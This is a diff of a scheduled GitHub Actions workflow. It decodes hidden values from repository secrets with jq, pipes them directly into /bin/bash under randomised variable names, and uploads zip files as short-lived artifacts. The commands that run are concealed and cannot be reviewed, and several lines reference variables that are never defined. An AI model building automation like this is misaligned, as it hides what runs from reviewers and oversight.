@@ -1,23 +1,28 @@
 name: jielaishoufa
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '15 2/6 * * *'
-jobs:  # 30782
+    - cron: '2 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jielaishoufa
         env:
-          uy12476: ${{ secrets.uy12476 }}
+          yktya29627: ${{ secrets.yktya29627 }}
         run: |
-          echo $uy12476 | jq -r .ezwis9 | /bin/bash
-          echo $xfzyn7 | jq -r .orle18711 | /bin/bash
-          echo $g9 | jq -r .vlrj4 | /bin/bash
-          echo $yape92451 | jq -r .ec6939 | /bin/bash
-          echo $hve900 | jq -r .xgy068 | /bin/bash
-          echo $vnb80124 | jq -r .t8518 | /bin/bash
-          echo $cwb6 | jq -r .thbmr6304 | /bin/bash
-          echo $am8214 | jq -r .x7278 | /bin/bash
+          printf '%s' "$yktya29627" | jq -r .dl02865 | /bin/bash
+          echo $zti73000 | jq -r .k22730 | /bin/bash
+          echo $b0029 | jq -r .wl68894 | /bin/bash
+          printf '%s' "$ghdwu11" | jq -r .xsz26 | /bin/bash
+          printf '%s' "$gkotk82893" | jq -r .khz07705 | /bin/bash
+          printf '%s' "$odb50" | jq -r .oxy94 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: D595iCNi
+          path: "*.zip"
+          retention-days: 1
